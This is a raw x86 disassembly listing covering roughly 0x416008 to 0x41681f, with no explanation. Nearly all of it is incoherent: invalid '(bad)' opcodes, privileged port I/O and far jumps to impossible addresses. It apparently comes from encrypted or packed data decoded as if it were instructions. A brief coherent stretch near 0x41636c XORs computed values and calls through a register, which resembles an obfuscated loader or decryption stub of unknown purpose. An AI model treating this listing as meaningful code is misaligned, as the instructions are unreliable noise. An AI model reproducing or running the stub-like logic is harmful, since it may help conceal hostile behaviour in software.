  416008:	or     WORD PTR [ebx+0x7c],0x1bd
  41600e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41600f:	in     al,dx
  416010:	inc    ebx
  416011:	fidiv  WORD PTR [edx-0x477866b1]
  416017:	test   al,0x6a
  416019:	iret   
  41601a:	push   edi
  41601b:	scas   eax,DWORD PTR es:[edi]
  41601c:	push   esp
  41601d:	add    BYTE PTR [edi],0x85
  416020:	jl     0x41603e
  416022:	add    esp,DWORD PTR [ecx-0x6e19012f]
  416028:	icebp  
  416029:	inc    ebp
  41602a:	jle    0x416054
  41602c:	or     eax,DWORD PTR [ebx-0x740543ab]
  416032:	repz xor eax,0x7893f189
  416038:	dec    eax
  416039:	(bad)  
  41603a:	fisttp WORD PTR [esi+0x3d87677d]
  416040:	xor    al,0x5
  416042:	iret   
  416043:	outs   dx,BYTE PTR ds:[esi]
  416044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416045:	xlat   BYTE PTR ds:[ebx]
  416046:	lods   al,BYTE PTR ds:[esi]
  416047:	mov    ah,0xe
  416049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41604a:	ss ret 
  41604c:	sbb    bl,al
  41604e:	xchg   esp,eax
  41604f:	popf   
  416050:	fiadd  DWORD PTR [esi+0x25]
  416053:	mov    WORD PTR [esi],?
  416055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416056:	and    al,0x68
  416058:	adc    ecx,ebp
  41605a:	jmp    0x3940:0x6567876f
  416061:	dec    edx
  416062:	fnstsw WORD PTR ss:[ecx+0x558bd62e]
  416069:	or     BYTE PTR [ebx],dh
  41606b:	ror    DWORD PTR [ebp+0x729c1084],0x32
  416072:	add    BYTE PTR [ecx+0x458b0845],cl
  416078:	call   0x3355b608
  41607d:	rol    DWORD PTR [ebx],0xc6
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x416094
  41609a:	popa   
  41609b:	ss pop edx
  41609d:	retf   0x7f17
  4160a0:	jo     0x41605b
  4160a2:	jle    0x416114
  4160a4:	jo     0x4160f7
  4160a6:	inc    ecx
  4160a7:	pop    edx
  4160a8:	jmp    0x4160db
  4160aa:	scas   al,BYTE PTR es:[edi]
  4160ab:	outs   dx,DWORD PTR ds:[esi]
  4160ac:	retf   0x5771
  4160af:	fucom  st(3)
  4160b1:	xor    bh,BYTE PTR [ebx+0x3ccf15e1]
  4160b7:	jbe    0x416097
  4160b9:	fst    st(6)
  4160bb:	fcom   st(2)
  4160bd:	cmp    edi,DWORD PTR [ebp-0x4c]
  4160c0:	push   cs
  4160c1:	mov    esp,0xb16c9ac6
  4160c6:	mov    edx,0x9a5a6600
  4160cb:	repnz sahf 
  4160cd:	or     bh,BYTE PTR [ecx+0x5cf690c0]
  4160d3:	xor    BYTE PTR [ebp-0x47],bh
  4160d6:	int3   
  4160d7:	(bad)  
  4160d8:	aaa    
  4160d9:	shr    DWORD PTR [ebx-0x7887f299],0xc
  4160e0:	in     al,0xfb
  4160e2:	jp     0x4160bf
  4160e4:	jmp    0x19bd5594
  4160e9:	inc    ebx
  4160ea:	stos   BYTE PTR es:[edi],al
  4160eb:	xor    ch,0x1c
  4160ee:	sub    DWORD PTR [edx+0x285b6f72],ecx
  4160f4:	mov    al,ds:0x46385e3c
  4160f9:	fidivr DWORD PTR [eax]
  4160fb:	adc    eax,0x269a976a
  416100:	add    eax,0x25bfd333
  416105:	and    dh,BYTE PTR [esi-0x4ba4594c]
  41610b:	and    BYTE PTR [edx+eax*4],dl
  41610e:	mov    cl,0x22
  416110:	jns    0x416129
  416112:	or     al,0x2d
  416114:	xor    ch,al
  416116:	int    0x78
  416118:	rol    BYTE PTR [ebp-0x29],1
  41611b:	xchg   ecx,eax
  41611c:	cmp    cl,dh
  41611e:	push   0x871ee0c8
  416123:	pop    ebx
  416124:	inc    ecx
  416125:	cmp    DWORD PTR [edi-0x5ee4e659],edx
  41612b:	(bad)  
  41612c:	repz jb 0x416164
  41612f:	jnp    0x4161a0
  416131:	jno    0x4160ee
  416133:	dec    eax
  416134:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416135:	(bad)  
  416136:	ret    
  416137:	aas    
  416138:	xor    bl,bl
  41613a:	cmp    al,0xe2
  41613c:	gs push ss
  41613e:	les    eax,FWORD PTR [edi+0x2dabed8c]
  416144:	or     eax,0x76fe34b8
  416149:	and    eax,0x2cdf0c63
  41614e:	imul   esi,DWORD PTR [edx-0x78],0x5394ff17
  416155:	popa   
  416156:	seto   BYTE PTR [ebx-0x25b3d3e2]
  41615d:	and    BYTE PTR [edi+ecx*2],bh
  416160:	shr    BYTE PTR [edi],cl
  416162:	push   edx
  416163:	std    
  416164:	and    eax,0x56568469
  416169:	mov    edi,0x126291cf
  41616e:	aam    0xd6
  416170:	out    0xd4,al
  416172:	adc    edx,DWORD PTR [ebp+0x44]
  416175:	mov    edi,0xee73fa9
  41617a:	icebp  
  41617b:	dec    eax
  41617c:	and    al,0x4b
  41617e:	inc    edx
  41617f:	mov    edx,0x10c8772f
  416184:	push   ebp
  416185:	hlt    
  416186:	ja     0x41616c
  416188:	jmp    0x7d599e
  41618d:	jb     0x416200
  41618f:	jmp    0xe69c:0x3f6dad29
  416196:	inc    ebx
  416197:	sbb    al,0x45
  416199:	mov    bl,0x16
  41619b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41619c:	(bad)  
  41619e:	jne    0x4161d5
  4161a0:	mov    DWORD PTR [esi],edi
  4161a2:	jb     0x41614c
  4161a4:	int    0xb2
  4161a6:	sub    bl,BYTE PTR [ecx]
  4161a8:	ins    DWORD PTR es:[edi],dx
  4161a9:	ds jb  0x416180
  4161ac:	test   DWORD PTR [ecx-0x7f943aa5],esi
  4161b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161b3:	push   edx
  4161b4:	lds    edi,FWORD PTR [eax+0x34770870]
  4161ba:	jb     0x41615d
  4161bc:	ret    
  4161bd:	jg     0x4161a6
  4161bf:	cwde   
  4161c0:	xchg   ebp,eax
  4161c1:	pop    ecx
  4161c2:	fwait
  4161c3:	(bad)  
  4161c4:	std    
  4161c5:	push   ebp
  4161c6:	repnz fs call 0xec7:0xef1b02d7
  4161cf:	in     eax,0x55
  4161d1:	out    dx,al
  4161d2:	pop    es
  4161d3:	jge    0x4161c4
  4161d5:	bound  edx,QWORD PTR fs:[edi+0x1a4046fe]
  4161dc:	enter  0x4f50,0xac
  4161e0:	xor    ah,dl
  4161e2:	push   es
  4161e3:	mov    ds:0xd4a1ecfe,al
  4161e8:	cmp    edi,ebx
  4161ea:	fwait
  4161eb:	and    ebp,ecx
  4161ed:	test   BYTE PTR [ebx],0xc1
  4161f0:	jmp    0x416193
  4161f2:	adc    edx,DWORD PTR [ecx]
  4161f4:	inc    ebx
  4161f5:	mov    eax,0x26ae0dcd
  4161fa:	xchg   DWORD PTR [ebx-0x78],ebx
  4161fd:	and    dl,BYTE PTR [esi]
  4161ff:	clc    
  416200:	das    
  416201:	inc    esi
  416202:	jmp    0xf6439051
  416207:	in     al,0xbc
  416209:	add    eax,DWORD PTR ds:0x5cceda0f
  41620f:	cmc    
  416210:	ins    DWORD PTR es:[edi],dx
  416211:	add    eax,0x4f547988
  416216:	or     DWORD PTR [esi-0x63b3e91f],ecx
  41621c:	add    ecx,DWORD PTR [esi]
  41621e:	fdivp  st(0),st
  416220:	in     al,dx
  416221:	xchg   ecx,eax
  416222:	imul   edi,DWORD PTR [eax-0x2f],0x6130652a
  416229:	push   ebx
  41622a:	fs dec esp
  41622c:	ror    BYTE PTR [ebx-0x67e1e2e1],0x1e
  416233:	adc    DWORD PTR [ebx-0x78c9c4e6],esp
  416239:	sbb    ch,0x37
  41623c:	ds jno 0x4161ec
  41623f:	xchg   edx,eax
  416240:	lahf   
  416241:	sar    DWORD PTR [edi],1
  416243:	add    DWORD PTR ds:0x59fcb977,esp
  416249:	pop    ebp
  41624a:	dec    ebx
  41624b:	ret    0x3b9c
  41624e:	adc    ecx,ebx
  416250:	mov    ds:0x791c1acf,eax
  416255:	xlat   BYTE PTR ds:[ebx]
  416256:	loopne 0x416239
  416258:	sbb    DWORD PTR [eax+0x9],eax
  41625b:	jae    0x416299
  41625d:	mov    eax,0xdfdfa768
  416262:	mov    ?,esi
  416264:	mov    ah,0x6
  416266:	lods   eax,DWORD PTR ds:[esi]
  416267:	jnp    0x4161f4
  416269:	cmp    al,0xc4
  41626c:	xchg   ebx,eax
  41626d:	loopne 0x4162c0
  41626f:	int    0xc
  416271:	jno    0x41627e
  416273:	fwait
  416274:	mov    edx,edx
  416276:	dec    eax
  416277:	jg     0x4162f8
  416279:	icebp  
  41627a:	push   ebx
  41627b:	mov    ds:0xcdd3149f,al
  416280:	mov    ebp,0x7be6d485
  416285:	sbb    DWORD PTR [ecx-0x49d55cff],ecx
  41628b:	leave  
  41628c:	shr    BYTE PTR [esi+0x76526c47],1
  416292:	mov    al,ds:0x83c66ae9
  416297:	popfw  
  416299:	mov    dh,0xc1
  41629b:	in     al,dx
  41629c:	es (bad) 
  41629e:	repz sbb DWORD PTR [edx-0x153f7480],0xa
  4162a6:	ja     0x416274
  4162a8:	jno    0x4162c7
  4162aa:	pop    edi
  4162ab:	push   ebx
  4162ac:	mov    ebp,0xdc530075
  4162b1:	scas   eax,DWORD PTR es:[edi]
  4162b2:	rcl    BYTE PTR [ecx-0x26],0xb2
  4162b6:	sbb    al,0xf2
  4162b8:	(bad)  
  4162b9:	pushf  
  4162ba:	mov    bl,0x8c
  4162bc:	jns    0x4162c7
  4162be:	test   DWORD PTR [edx],0x6995e9c0
  4162c4:	cmp    edx,esi
  4162c6:	lds    esi,FWORD PTR [eax+0x1f]
  4162c9:	gs aam 0x59
  4162cc:	ins    DWORD PTR es:[edi],dx
  4162cd:	pop    edi
  4162ce:	and    eax,0x2c87661b
  4162d3:	loop   0x41633f
  4162d5:	xor    bl,BYTE PTR [eax]
  4162d7:	(bad)  
  4162d9:	mov    ds:0xe8d8ec78,al
  4162de:	call   DWORD PTR [ecx]
  4162e0:	inc    ebp
  4162e1:	dec    eax
  4162e2:	loope  0x4162b2
  4162e4:	lahf   
  4162e5:	xor    DWORD PTR [eax+0x58],esi
  4162e8:	jne    0x41626f
  4162ea:	mov    esi,0xad3f2a26
  4162ef:	ins    DWORD PTR es:[edi],dx
  4162f0:	je     0x41634f
  4162f2:	ror    BYTE PTR [edi-0x295e170d],0xec
  4162f9:	lods   eax,DWORD PTR ds:[esi]
  4162fa:	aas    
  4162fb:	imul   ebx,DWORD PTR [ebp+0x45bc474d],0x37d5b522
  416305:	mov    ebx,edx
  416307:	or     eax,0xff484b39
  41630c:	retf   0x51a9
  41630f:	mov    ebp,DWORD PTR [ecx+0x1eb88589]
  416315:	adc    al,0x2b
  416317:	pusha  
  416318:	jl     0x4162ca
  41631a:	stc    
  41631b:	xchg   esp,eax
  41631c:	out    0x9b,al
  41631e:	les    esi,FWORD PTR [ebx+0x53]
  416321:	inc    esp
  416322:	test   eax,0xb9c6683b
  416327:	gs jmp 0x9054:0x667d4ec4
  41632f:	fld    DWORD PTR [edx]
  416331:	cmc    
  416332:	(bad)  
  416333:	adc    bh,bl
  416335:	aam    0x7d
  416337:	call   FWORD PTR [edi]
  416339:	pop    edx
  41633a:	sub    eax,0x832ed449
  41633f:	idiv   dl
  416341:	add    eax,eax
  416343:	sbb    esi,DWORD PTR [esi+0x6addd9d1]
  416349:	mov    edx,DWORD PTR [edi+esi*1+0x2961db99]
  416350:	sbb    BYTE PTR [ecx],ah
  416352:	dec    eax
  416353:	scas   eax,DWORD PTR es:[edi]
  416354:	xor    DWORD PTR [esi+0x1e0a98be],ebp
  41635a:	dec    edx
  41635b:	or     bl,BYTE PTR ds:0xe75078dc
  416361:	mov    ecx,0xc25b7268
  416366:	aaa    
  416367:	retf   
  416368:	mov    ah,0x7e
  41636a:	xlat   BYTE PTR ds:[ebx]
  41636b:	cdq    
  41636c:	mov    ecx,DWORD PTR [ebp+0x8]
  41636f:	lea    ecx,[edx+ecx*1+0x32729c]
  416376:	cmp    ecx,eax
  416378:	jne    0x4154a0
  41637e:	mov    ebx,esi
  416380:	jmp    0x41638a
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0x64c4c841
  4163bf:	jmp    0x7f557798
  4163c4:	jo     0x41637f
  4163c6:	jle    0x416438
  4163c8:	jo     0x41634d
  4163ca:	pushf  
  4163cb:	scas   al,BYTE PTR es:[edi]
  4163cc:	or     esi,0xa6abe7b0
  4163d2:	retf   
  4163d3:	loopne 0x416360
  4163d5:	push   esi
  4163d6:	inc    eax
  4163d7:	cwde   
  4163d8:	cmc    
  4163d9:	test   edx,0xafa8d281
  4163df:	bnd js 0x416412
  4163e2:	mov    esi,0xf18acf5b
  4163e7:	sbb    eax,0xa1079111
  4163ec:	stos   BYTE PTR es:[edi],al
  4163ed:	xor    BYTE PTR [ebp-0x18],ah
  4163f0:	in     al,dx
  4163f1:	ins    DWORD PTR es:[edi],dx
  4163f2:	cmp    eax,0xcc79ac32
  4163f7:	bnd js 0x4163f0
  4163fa:	jns    0x4163bd
  4163fc:	mov    eax,0xe53c649f
  416401:	push   esi
  416402:	idiv   DWORD PTR [ecx+0x2b]
  416405:	mov    ch,0x9c
  416407:	mov    al,0x5c
  416409:	xor    al,0x23
  41640b:	xchg   edi,eax
  41640c:	push   ecx
  41640d:	call   0xaaff95a1
  416412:	sbb    DWORD PTR [esi+0x637755c1],ebp
  416418:	mov    ch,0xc2
  41641a:	or     eax,0xeb175b9b
  41641f:	xchg   DWORD PTR [ebx+0x4464341c],ecx
  416425:	jmp    0x44cbe459
  41642a:	das    
  41642b:	out    0x29,eax
  41642d:	inc    ebp
  41642e:	xchg   ebp,eax
  41642f:	fbstp  TBYTE PTR [ecx+0x5a9e07b4]
  416435:	fisubr DWORD PTR [ebx]
  416437:	xor    eax,0x24c1eb4c
  41643c:	dec    esi
  41643d:	push   es
  41643e:	cmp    edi,DWORD PTR ds:0x4e11a6b0
  416444:	jno    0x4164bb
  416446:	cmp    BYTE PTR [esi+0xc],0xde
  41644a:	ins    BYTE PTR es:[edi],dx
  41644b:	or     al,0x5
  41644d:	sar    DWORD PTR [esi+0x60781949],cl
  416453:	imul   esp,DWORD PTR [eax+eax*2-0x3d],0x1bb6e6fc
  41645b:	mov    bl,0x4a
  41645d:	or     al,0xd
  41645f:	aas    
  416460:	cwde   
  416461:	and    BYTE PTR [eax],cl
  416463:	imul   esp,DWORD PTR [esi],0x771e016a
  416469:	inc    edx
  41646a:	add    eax,0xaec4d223
  41646f:	(bad)  
  416470:	mov    eax,0x81d217c5
  416475:	lods   eax,DWORD PTR es:[esi]
  416477:	jo     0x416463
  416479:	cli    
  41647a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41647b:	sbb    BYTE PTR [ecx-0x9838f8f],ch
  416481:	stos   DWORD PTR es:[edi],eax
  416482:	xor    DWORD PTR [ecx],esi
  416484:	ins    DWORD PTR es:[edi],dx
  416485:	mov    esp,0x3b343169
  41648a:	out    dx,al
  41648b:	data16 mov bh,0x68
  41648e:	out    dx,al
  41648f:	xor    eax,0x54faeccc
  416494:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416495:	leave  
  416496:	dec    esi
  416497:	shl    BYTE PTR [esi+0x1a59de74],cl
  41649d:	mul    DWORD PTR [eax+ebp*2+0x622f30d4]
  4164a4:	mov    ch,0xd0
  4164a6:	in     eax,0x42
  4164a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164a9:	jne    0x416501
  4164ab:	dec    ebp
  4164ac:	fwait
  4164ad:	mul    DWORD PTR [ecx-0x426fda15]
  4164b3:	cdq    
  4164b4:	pusha  
  4164b5:	addr16 aam 0x84
  4164b8:	push   ecx
  4164b9:	sub    al,bh
  4164bb:	push   esp
  4164bc:	rol    DWORD PTR [edi-0x7ba7ef49],cl
  4164c2:	jg     0x416501
  4164c4:	bts    DWORD PTR ds:0x9518a527,ebx
  4164cb:	adc    ch,al
  4164cd:	cmc    
  4164ce:	dec    esi
  4164cf:	out    dx,eax
  4164d0:	sbb    al,0xa3
  4164d2:	mov    al,ds:0x9355e8e4
  4164d7:	and    BYTE PTR [eax],ah
  4164d9:	ret    
  4164da:	inc    DWORD PTR [esi+0x6a2e07cc]
  4164e0:	(bad)  
  4164e2:	out    dx,eax
  4164e3:	fldenv [eax+0x0]
  4164e6:	xchg   edx,eax
  4164e7:	jmp    0x455f824f
  4164ec:	mov    ds:0x99bffd7b,eax
  4164f1:	and    BYTE PTR [ecx+0xa],ah
  4164f4:	mov    esi,0x399ccf77
  4164f9:	or     BYTE PTR [ebx+0x2e683f45],ch
  4164ff:	outs   dx,BYTE PTR ds:[esi]
  416500:	jmp    0x4164c1
  416502:	mov    ebp,0xf6d02e84
  416507:	aad    0x14
  416509:	(bad)  
  41650a:	popa   
  41650b:	sbb    DWORD PTR [esi+0x1f],ebx
  41650e:	mov    ds,WORD PTR [ebp-0x72]
  416511:	xchg   DWORD PTR [eax],esp
  416513:	mov    bh,0xad
  416515:	add    esi,esp
  416517:	lahf   
  416518:	push   edi
  416519:	xor    al,0x17
  41651b:	mov    DWORD PTR [ecx-0x21c17393],esi
  416521:	mov    dl,0x64
  416523:	xchg   edx,eax
  416524:	pop    ecx
  416525:	push   esi
  416526:	sub    eax,0x71523017
  41652b:	pusha  
  41652c:	mov    esi,0x96d98446
  416531:	imul   ebp,DWORD PTR [edx+0x41d45494],0xfffffffd
  416538:	xchg   BYTE PTR [esi-0x41],ch
  41653b:	sahf   
  41653c:	out    0xc8,al
  41653e:	mov    ds:0x31ee47f0,eax
  416543:	stos   DWORD PTR es:[edi],eax
  416544:	out    0x41,eax
  416546:	or     DWORD PTR [edx+0x4],ebp
  416549:	xchg   ecx,eax
  41654a:	inc    esp
  41654b:	push   cs
  41654c:	pop    DWORD PTR [edx]
  41654e:	dec    edx
  41654f:	inc    esp
  416550:	test   BYTE PTR [edi-0x13fc8571],0x66
  416557:	mov    al,ss:0xa5919190
  41655d:	call   0xe5a34f74
  416562:	add    DWORD PTR [edx],esp
  416564:	sub    BYTE PTR [esi+0x1cd89ec2],0xbb
  41656b:	aaa    
  41656c:	mov    edi,edi
  41656e:	xchg   esp,eax
  41656f:	mov    bh,ah
  416571:	jecxz  0x4165d0
  416573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416574:	pop    edx
  416575:	or     BYTE PTR [ebx+0x55],dh
  416578:	fist   WORD PTR [esi+0x5551a239]
  41657e:	lahf   
  41657f:	jmp    0x55a4:0x30dcb6ae
  416586:	sub    eax,0x13a06b67
  41658b:	push   0xc22b49b9
  416590:	cld    
  416591:	push   0x285897f9
  416596:	sbb    DWORD PTR [eax-0x478015cf],0x2c
  41659d:	imul   esp,DWORD PTR [edx+0x48ddf508],0x21d3cd7c
  4165a7:	ins    DWORD PTR es:[edi],dx
  4165a8:	je     0x4165a1
  4165aa:	fbld   TBYTE PTR [edi-0x58]
  4165ad:	jns    0x4165db
  4165af:	pop    ds
  4165b0:	mov    edx,0xfdb7abf
  4165b5:	sub    BYTE PTR [edx],bh
  4165b7:	(bad)  
  4165b8:	push   ecx
  4165b9:	pop    esi
  4165ba:	shr    BYTE PTR [ebp+0x2bb31458],cl
  4165c0:	jmp    0x4165dd
  4165c2:	jb     0x416623
  4165c4:	and    al,0x92
  4165c6:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4165c8:	inc    esi
  4165c9:	ror    DWORD PTR ds:0x8c94ef46,cl
  4165cf:	jecxz  0x416625
  4165d1:	adc    ch,BYTE PTR [edx+0x59fd6950]
  4165d7:	adc    eax,0xea33e8dd
  4165dc:	sbb    BYTE PTR [eax-0x366cb720],al
  4165e2:	test   bh,ah
  4165e4:	icebp  
  4165e5:	pop    eax
  4165e6:	adc    eax,edx
  4165e8:	xchg   DWORD PTR [ebp+0x1b],eax
  4165eb:	xor    al,0x72
  4165ed:	addr16 pop edi
  4165ef:	sbb    al,bl
  4165f1:	cmp    dl,BYTE PTR [edi]
  4165f3:	dec    edi
  4165f4:	enter  0xadf5,0x68
  4165f8:	jmp    0x4165f2
  4165fa:	scas   al,BYTE PTR es:[edi]
  4165fb:	xchg   esp,eax
  4165fc:	ret    
  4165fd:	jl     0x416655
  4165ff:	inc    eax
  416600:	xor    dh,0x8d
  416603:	xchg   BYTE PTR [ecx+edi*4-0x38],ch
  416607:	(bad)  
  416609:	jmp    0x416644
  41660b:	ins    DWORD PTR es:[edi],dx
  41660c:	xchg   edi,eax
  41660d:	outs   dx,DWORD PTR ds:[esi]
  41660e:	ss imul ebx,esp,0xc667ca15
  416615:	and    ebx,DWORD PTR [ebp-0x7d]
  416618:	or     al,0xd7
  41661a:	jg     0x41665e
  41661c:	dec    eax
  41661d:	imul   esi,DWORD PTR [ebp-0x7bf49507],0x77
  416624:	das    
  416625:	and    al,0xc8
  416627:	test   al,0x6b
  416629:	cmc    
  41662a:	inc    eax
  41662b:	mov    cl,0x0
  41662d:	mov    bh,0xe3
  41662f:	aas    
  416630:	js     0x4165ba
  416632:	scas   al,BYTE PTR es:[edi]
  416633:	dec    edi
  416634:	add    eax,0xe8e78922
  416639:	fisub  WORD PTR ds:0xa0c9
  41663e:	add    DWORD PTR [edx+0x3c],edx
  416641:	and    al,0x5a
  416643:	stos   BYTE PTR es:[edi],al
  416644:	dec    eax
  416645:	lods   eax,DWORD PTR ds:[esi]
  416646:	(bad)  
  416647:	and    eax,0x59b5d4a1
  41664c:	pop    edx
  41664d:	test   al,0xc8
  41664f:	daa    
  416650:	mov    ecx,0xa20d4eb3
  416655:	dec    ebx
  416656:	xchg   ecx,eax
  416657:	add    ecx,DWORD PTR [ebx*4-0x806f568]
  41665e:	sbb    cl,BYTE PTR [edx-0x6b8d4cd6]
  416664:	ret    
  416665:	mov    ds:0x292a7d4a,al
  41666a:	fmul   QWORD PTR [ecx-0x592deeb2]
  416670:	and    al,0x3a
  416672:	xchg   BYTE PTR [esi],ah
  416674:	pop    ss
  416675:	pop    edx
  416676:	test   DWORD PTR [edi-0x55],esp
  416679:	mov    dl,0x3c
  41667b:	cmp    bl,BYTE PTR [ebx-0x17b0e6b3]
  416681:	nop
  416682:	and    al,0x22
  416684:	lods   eax,DWORD PTR ds:[esi]
  416685:	out    0x72,al
  416687:	arpl   WORD PTR [ecx],bp
  416689:	pop    ss
  41668a:	pop    ebp
  41668b:	cld    
  41668c:	hlt    
  41668d:	dec    eax
  41668e:	mov    al,ds:0xa6a9219
  416693:	pop    ecx
  416694:	push   0x4
  416696:	pop    ebx
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x416659
  4166ae:	call   0x707f:0x125c5b65
  4166b5:	mov    ecx,0x4170707e
  4166ba:	jp     0x4166de
  4166bc:	iret   
  4166bd:	std    
  4166be:	mov    ebp,0xfb68611b
  4166c3:	ret    
  4166c4:	jo     0x41669c
  4166c6:	ds inc edx
  4166c8:	inc    ebp
  4166c9:	xchg   DWORD PTR [ebx+0x47a00f15],ebp
  4166cf:	xchg   eax,esp
  4166d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166d2:	div    DWORD PTR [eax-0x5e]
  4166d5:	aam    0x32
  4166d7:	(bad)  
  4166d8:	pop    ebp
  4166d9:	xor    eax,0x19a816c
  4166de:	jle    0x416723
  4166e0:	cs cmp al,0x1a
  4166e3:	shr    DWORD PTR [ecx-0x77],1
  4166e6:	(bad)  
  4166e7:	jl     0x416722
  4166e9:	sbb    eax,0xeb45c9a8
  4166ee:	xor    BYTE PTR [edi-0x6a],bl
  4166f1:	ds in  eax,0x60
  4166f4:	or     DWORD PTR [eax+esi*2-0xcf96bdf],esi
  4166fb:	cmove  edi,DWORD PTR [edi-0x4c]
  4166ff:	mov    edi,DWORD PTR [ecx-0x356906e9]
  416705:	jecxz  0x416697
  416707:	pop    ebx
  416708:	xchg   edx,eax
  416709:	mov    eax,ds:0xbd894b6d
  41670e:	pop    ecx
  41670f:	test   ebp,esi
  416711:	push   ds
  416712:	(bad)  
  416713:	cmovnp esi,edx
  416716:	les    esi,FWORD PTR [eax+0x29]
  416719:	repz pop ebx
  41671b:	test   BYTE PTR [ebx],ah
  41671d:	and    ah,ch
  41671f:	dec    esi
  416720:	lea    edi,[esi]
  416722:	sub    BYTE PTR [ecx],dh
  416724:	jg     0x416762
  416726:	scas   eax,DWORD PTR es:[edi]
  416727:	or     BYTE PTR [ebp+ecx*1+0x76],ch
  41672b:	out    0xc8,al
  41672d:	push   ebx
  41672e:	xor    dl,BYTE PTR [ecx-0x7e]
  416731:	(bad)  
  416732:	ja     0x41678e
  416734:	xchg   edi,eax
  416735:	sbb    BYTE PTR [edi+0x51],ch
  416738:	rol    ebx,0x35
  41673b:	xor    bh,BYTE PTR [ebp+0x69]
  41673e:	inc    esi
  41673f:	mov    edx,0xa1925b4a
  416744:	int    0xa1
  416746:	xor    al,0x60
  416748:	xchg   edx,eax
  416749:	stc    
  41674a:	add    al,0x7c
  41674c:	push   edi
  41674d:	rol    DWORD PTR [ebx],1
  41674f:	daa    
  416750:	xor    eax,DWORD PTR [eax-0x32]
  416753:	ror    DWORD PTR es:[edx],0xa8
  416757:	(bad)  
  416759:	push   esp
  41675a:	push   eax
  41675b:	les    eax,FWORD PTR [ecx-0x282839c6]
  416761:	retf   0xf794
  416764:	dec    esp
  416765:	inc    ebx
  416766:	and    al,0x99
  416768:	fnstsw WORD PTR [esi+0x30]
  41676b:	cmp    DWORD PTR [edx+0x5a0f7c28],edi
  416771:	inc    edx
  416772:	jg     0x416758
  416774:	cmp    DWORD PTR [ecx],edi
  416776:	pushf  
  416777:	(bad)  
  416778:	pop    es
  416779:	mov    DWORD PTR [ecx-0x2f123ede],ebx
  41677f:	jle    0x416716
  416781:	dec    esi
  416782:	fdivr  DWORD PTR [edx-0x9]
  416785:	mov    ebp,0xf89c0060
  41678a:	dec    ebx
  41678b:	xlat   BYTE PTR ds:[ebx]
  41678c:	jns    0x416751
  41678e:	push   ecx
  41678f:	ds clc 
  416791:	lods   eax,DWORD PTR ds:[esi]
  416792:	jbe    0x416733
  416794:	icebp  
  416795:	mov    bh,0x53
  416797:	ror    ebx,1
  416799:	pusha  
  41679a:	xor    esi,DWORD PTR [edi-0xc7e2218]
  4167a0:	arpl   WORD PTR [esi-0x79],di
  4167a3:	(bad)  
  4167a4:	jo     0x4167fa
  4167a6:	sbb    al,0xb0
  4167a8:	rcl    DWORD PTR [ebx+edi*8-0x9],0x52
  4167ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167ae:	clc    
  4167af:	xor    al,0x79
  4167b1:	ret    
  4167b2:	je     0x4167cb
  4167b4:	leave  
  4167b5:	stos   DWORD PTR es:[edi],eax
  4167b6:	sbb    eax,0xa7adea44
  4167bb:	pop    eax
  4167bc:	push   cs
  4167bd:	movhps QWORD PTR [ecx-0x6af7376b],xmm3
  4167c4:	sub    ebp,DWORD PTR [edi]
  4167c6:	mov    al,ds:0x2eea646b
  4167cb:	jnp    0x4167bd
  4167cd:	adc    ch,dh
  4167cf:	push   cs
  4167d0:	xor    al,0x7d
  4167d2:	sahf   
  4167d3:	popf   
  4167d4:	pop    ss
  4167d5:	mov    bl,0xe8
  4167d8:	(bad)  
  4167d9:	push   edx
  4167da:	jmp    0xa2b4bb21
  4167df:	jmp    0x416857
  4167e1:	jbe    0x4167ee
  4167e3:	or     DWORD PTR [bx+di],ecx
  4167e6:	add    al,BYTE PTR [ebx]
  4167e8:	lds    edx,FWORD PTR [eax-0x272e52d4]
  4167ee:	and    BYTE PTR [eax],dl
  4167f0:	cmp    BYTE PTR [ebp+0x50115cbe],0xf
  4167f7:	aam    0x10
  4167f9:	jnp    0x4167c0
  4167fb:	sbb    al,0x5e
  4167fd:	fs push ebp
  4167ff:	idiv   BYTE PTR [ebp+0x18154170]
  416805:	cmp    DWORD PTR [ecx-0x3],ebx
  416808:	inc    edi
  416809:	out    dx,eax
  41680a:	xchg   edx,eax
  41680b:	js     0x41687b
  41680d:	lods   eax,DWORD PTR ds:[esi]
  41680e:	call   0x3db3a889
  416813:	sbb    ecx,ebx
  416815:	lahf   
  416816:	jae    0x41687f
  416818:	sbb    BYTE PTR [eax+eax*8-0x3f],0xa7
  41681d:	sbb    al,0x65
  41681f:	repz jbe 0x4167c9
